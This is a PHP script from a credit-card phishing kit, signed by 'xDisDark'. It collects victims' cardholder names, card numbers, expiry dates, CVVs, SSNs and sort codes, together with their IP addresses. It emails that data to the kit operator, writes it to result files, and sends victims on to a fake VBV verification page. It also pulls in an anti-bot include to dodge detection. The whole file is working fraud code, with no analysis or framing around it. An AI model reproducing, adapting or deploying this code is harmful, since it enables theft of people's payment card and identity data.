<?php


/*

 */
session_start();
include 'antibots.php';
include 'config.php';


if(isset($_POST['btn_card'])){

    if(isset($_POST['vbv_ready']) == true){

        $cardholder=  $_SESSION['CardHolder'] = $_POST['CardHolder'];
        $cardnumber = $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $date_ex = $_SESSION['date_ex'] = $_POST['date_ex'];
        $cvv = $_SESSION['cvv'] = $_POST['cvv'];
        $ssn = $_SESSION['ssn'] = $_POST['ssn'];
        $ssn1 = $_SESSION['ssn1'] = $_POST['ssn1'];
        $iP_adress = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
        $country =$_SESSION['country']= $_POST['country'];
        include('type_card.php');
        $Info_LOG = "
|===============| CC-VBV xDisDark |================|
|Type Card        : $type_de_cartes
|Card Holder      : $CardHolder
|Card Number      : $cardnumber
|Date EX          : $date_ex
|CVV              : $cvv
|SSN              : $ssn1
|SortCode         : $ssn
|IP Adresse       : $iP_adress";


        // Don't Touche
//Email
        if($Send_Email !== 1 ){}else{
            $subject = '♥ CC INFOS FROM ♥ : '.$country.' '.$iP_adress.' ';
            $headers = 'From: xDisDark' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $Info_LOG, $headers);
            header("location:vbv_verif.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }

//FTP
        if($Ftp_Write !== 1 ){}else{
            $file = fopen("rst/Result-By-nOob-Assasin." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
            header("location:vbv_verif.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
        header("location:verif_vbv.php?y".md5('nassimdz')."");
    }




else{

        $cardholder=  $_SESSION['CardHolder'] = $_POST['CardHolder'];
        $cardnumber =  $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $date_ex = $_POST['date_ex'];
        $cvv = $_POST['cvv'];
        $ssn = $_POST['ssn'];
        $ssn1 = $_POST['ssn1'];
        $iP_adress = $_SERVER['REMOTE_ADDR'];
        $country =$_SESSION['country']= $_POST['country'];
        include('type_card.php');
        $Info_LOG = "
|---------------- CC-VBV ---------------|
|Type Card        : $type_de_cartes
|Card Holder      : $cardholder
|Card Number      : $cardnumber
|Date EX          : $date_ex
|CVV              : $cvv
|SSN              : $ssn1
|SortCode         : $ssn
|IP Adresse       : $iP_adress
|---------------------------------------------|
|--------------By [xDisDark]--------------|
";





// Don't Touche
//Email
        if($Send_Email !== 1 ){}else{
            $subject = '♥ CC INFOS FROM ♥ : '.$country.' '.$iP_adress.' ';
            $headers = 'From: xDisDark' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $Info_LOG, $headers);
           header("location:verif_vbv.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }

//FTP
        if($Ftp_Write !== 1 ){}else{
            $file = fopen("rst/Result-By-OuNi-XhacK." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
            header("location:verif_vbv.php?websrc=".md5('nOobAssas!n')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
    }

}







